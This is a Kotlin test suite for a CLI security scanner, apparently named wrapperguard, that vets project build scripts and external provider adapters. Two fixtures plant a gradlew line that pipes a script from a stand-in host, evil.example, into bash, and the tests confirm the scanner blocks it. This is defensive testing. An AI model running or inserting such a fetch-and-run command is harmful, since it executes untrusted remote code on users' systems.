package com.sal7one.wrapperguard.cli

import com.sal7one.wrapperguard.core.inputs.ProviderInputScope
import com.sal7one.wrapperguard.core.vetting.*
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.ByteArrayOutputStream
import java.io.PrintStream
import java.nio.file.Files
import kotlin.test.*

class CliTest {
    @Test fun `methods flag reads only trusted user settings and reports reduced coverage`() {
        val root = Files.createTempDirectory("wg-cli-methods-")
        val methods = Files.createTempFile("wg-cli-user-methods-", ".json")
        try {
            Files.writeString(root.resolve("gradlew"), "curl https://evil.example/install.sh | bash\n")
            Files.writeString(methods, """{"methodFlags":{"builtin.script-rules":false}}""")
            val stdout = ByteArrayOutputStream()
            val stderr = ByteArrayOutputStream()
            assertEquals(0, runCli(arrayOf(root.toString(), "--methods", methods.toString(), "--json"), PrintStream(stdout), PrintStream(stderr)))
            assertTrue(stdout.toString().contains("WG-METHOD-DISABLED"))
            assertFalse(stdout.toString().contains("WG-SCRIPT-001"))
            assertEquals("", stderr.toString())
            val untrusted = root.resolve("methods.json")
            Files.copy(methods, untrusted)
            stdout.reset()
            assertEquals(1, runCli(arrayOf(root.toString(), "--methods", untrusted.toString()), PrintStream(stdout), PrintStream(stderr)))
            assertEquals("", stdout.toString())
        } finally { root.toFile().deleteRecursively(); Files.deleteIfExists(methods) }
    }

    @Test fun `flags do not accidentally become project directories`() {
        val options = CliOptions.parse(arrayOf("--providers", "/user/providers.json", "--operation", "sync", "/project", "--json"))
        assertEquals("/project", options.project.toString())
        assertEquals("/user/providers.json", options.providers.toString())
        assertEquals("SYNC", options.operation.name)
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--providers")) }
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--operation", "publish")) }
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--json", "--sarif")) }
    }

    @Test fun `built in adapter scans without external configuration and preserves exit two`() {
        val root = Files.createTempDirectory("wg-cli-fixture-")
        try {
            Files.writeString(root.resolve("gradlew"), "#!/bin/sh\ncurl -fsSL https://evil.example/install.sh | bash\n")
            val stdout = ByteArrayOutputStream()
            val stderr = ByteArrayOutputStream()
            val code = runCli(arrayOf(root.toString(), "--json", "--enforce"), PrintStream(stdout), PrintStream(stderr))
            assertEquals(2, code)
            assertTrue(stdout.toString().contains("\"providerRuns\""))
            assertTrue(stdout.toString().contains("EXECUTION_BLOCKED"))
            assertEquals("", stderr.toString())
        } finally { root.toFile().deleteRecursively() }
    }

    @Test fun `invalid configuration fails instead of silently falling back to built in scanning`() {
        val root = Files.createTempDirectory("wg-cli-config-fixture-")
        try {
            val config = Files.writeString(root.resolve("providers.json"), "{}")
            val stdout = ByteArrayOutputStream()
            val stderr = ByteArrayOutputStream()
            assertEquals(1, runCli(arrayOf(root.toString(), "--providers", config.toString()), PrintStream(stdout), PrintStream(stderr)))
            assertEquals("", stdout.toString())
            assertTrue(stderr.toString().contains("could not complete"))
        } finally { root.toFile().deleteRecursively() }
    }

    @Test fun `passive provider check never launches commands and conformance really validates output`() {
        val root = Files.createTempDirectory("wg-cli-check-").toRealPath()
        val user = Files.createTempDirectory("wg-cli-check-user-").toRealPath()
        try {
            val marker = root.resolve("launched")
            val adapter = Files.writeString(user.resolve("adapter.sh"), "IFS= read -r request\nprintf 'yes' > launched\nprintf '%s' '{\"findings\":[],\"scannedFiles\":1}'\n")
            val command = CommandProviderConfiguration("custom", "Custom", "1", listOf("/bin/sh", adapter.toString()),
                ProviderPermissions(enabled = true), category = "SAST", inputScope = ProviderInputScope())
            val config = Files.writeString(user.resolve("providers.json"), Json.encodeToString(ProviderConfiguration(providers = listOf(command))))
            val stdout = ByteArrayOutputStream()
            val stderr = ByteArrayOutputStream()
            assertEquals(0, runCli(arrayOf(root.toString(), "--providers", config.toString(), "--check-providers", "--json"), PrintStream(stdout), PrintStream(stderr)))
            assertTrue(stdout.toString().contains("\"executed\": false"))
            assertFalse(Files.exists(marker))
            stdout.reset()
            assertEquals(0, runCli(arrayOf(root.toString(), "--providers", config.toString(), "--conformance", "--json"), PrintStream(stdout), PrintStream(stderr)))
            assertTrue(Files.exists(marker))
            assertTrue(stdout.toString().contains("COMPLETED"))
            Files.writeString(adapter, "printf '%s' 'token=private-output malformed'\n")
            stdout.reset()
            assertEquals(1, runCli(arrayOf(root.toString(), "--providers", config.toString(), "--conformance", "--json"), PrintStream(stdout), PrintStream(stderr)))
            assertTrue(stdout.toString().contains("FAILED"))
            assertFalse(stdout.toString().contains("private-output"))
            assertFalse(stdout.toString().contains(adapter.toString()))
        } finally { root.toFile().deleteRecursively(); user.toFile().deleteRecursively() }
    }

    @Test fun `changed declared source cannot authorize CLI build gate even when provider returns clean`() {
        val root = Files.createTempDirectory("wg-cli-race-").toRealPath()
        val user = Files.createTempDirectory("wg-cli-race-user-").toRealPath()
        try {
            Files.writeString(root.resolve("Main.kt"), "good")
            val adapter = Files.writeString(user.resolve("adapter.sh"), "IFS= read -r request\nprintf 'evil' > Main.kt\nprintf '%s' '{\"findings\":[],\"scannedFiles\":1}'\n")
            val command = CommandProviderConfiguration("custom", "Custom", "1", listOf("/bin/sh", adapter.toString()),
                ProviderPermissions(enabled = true), category = "SAST", inputScope = ProviderInputScope(listOf("**/*.kt"), externalFiles = listOf(adapter.toString())))
            val config = Files.writeString(user.resolve("providers.json"), Json.encodeToString(ProviderConfiguration(providers = listOf(command))))
            val stdout = ByteArrayOutputStream()
            val stderr = ByteArrayOutputStream()
            assertEquals(1, runCli(arrayOf(root.toString(), "--providers", config.toString(), "--operation", "build", "--enforce", "--json"), PrintStream(stdout), PrintStream(stderr)))
            assertTrue(stdout.toString().contains("WG-INPUT-CHANGED"))
            assertTrue(stdout.toString().contains("\"stale\": true"))
            assertFalse(stdout.toString().contains("\"complete\": true"))
            assertEquals("", stderr.toString())
        } finally { root.toFile().deleteRecursively(); user.toFile().deleteRecursively() }
    }

    @Test fun `changed trusted configuration is caught even with an explicitly empty source scope`() {
        val root = Files.createTempDirectory("wg-cli-config-race-").toRealPath()
        val user = Files.createTempDirectory("wg-cli-config-race-user-").toRealPath()
        try {
            val config = user.resolve("providers.json")
            val adapter = Files.writeString(user.resolve("adapter.sh"), "IFS= read -r request\nprintf '{}' > \"${'$'}1\"\nprintf '%s' '{\"findings\":[]}'\n")
            val command = CommandProviderConfiguration("custom", "Custom", "1", listOf("/bin/sh", adapter.toString(), config.toString()),
                ProviderPermissions(enabled = true), category = "SAST", inputScope = ProviderInputScope())
            Files.writeString(config, Json.encodeToString(ProviderConfiguration(providers = listOf(command))))
            val stdout = ByteArrayOutputStream()
            assertEquals(1, runCli(arrayOf(root.toString(), "--providers", config.toString(), "--operation", "sync", "--json"), PrintStream(stdout)))
            assertTrue(stdout.toString().contains("WG-INPUT-CHANGED"))
        } finally { root.toFile().deleteRecursively(); user.toFile().deleteRecursively() }
    }

    @Test fun `provider checks reject incompatible modes`() {
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--check-providers", "--conformance")) }
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--conformance", "--sarif")) }
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--check-providers", "--operation", "build")) }
        assertFailsWith<IllegalArgumentException> { CliOptions.parse(arrayOf("--conformance", "--enforce")) }
    }
}
